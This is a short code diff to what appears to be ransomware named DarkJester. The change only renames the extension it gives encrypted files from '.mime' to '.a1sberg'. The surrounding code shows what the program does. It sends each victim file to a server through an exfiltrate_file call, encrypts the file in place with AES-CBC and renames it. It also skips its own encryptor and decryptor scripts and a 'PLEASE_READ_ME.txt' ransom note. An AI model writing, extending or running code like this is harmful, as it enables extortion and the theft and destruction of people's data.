@@ -40,7 +40,7 @@ class DarkJester:
         try:
             if os.path.basename(filepath) in ["darkjester_encryptor_mass_linux.py", "darkjester_encryptor_mass_linux", "darkjester_encryptor_specific_testing_linux", "darkjester_encryptor_specific_testing_linux.py", "PLEASE_READ_ME.txt", "darkjester_decryptor_mass_linux.py", "darkjester_decryptor_mass_linux", "darkjester_decryptor_specific_testing_linux", "darkjester_encryptor_specific_testing_linux.py"]:
                 return
-            if filepath.endswith('.mime'):
+            if filepath.endswith('.a1sberg'):
                 return
             self.exfiltrate_file(filepath, server_url)
             cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
@@ -48,7 +48,7 @@ class DarkJester:
                 padded_data = pad(src.read(), AES.block_size)
             with open(filepath, 'wb') as dst:
                 dst.write(self.iv + cipher.encrypt(padded_data))
-            new_filepath = f"{filepath}.mime"
+            new_filepath = f"{filepath}.a1sberg"
             os.rename(filepath, new_filepath)
             print(f"Encrypted: {filepath}")
         except (PermissionError, OSError) as e:
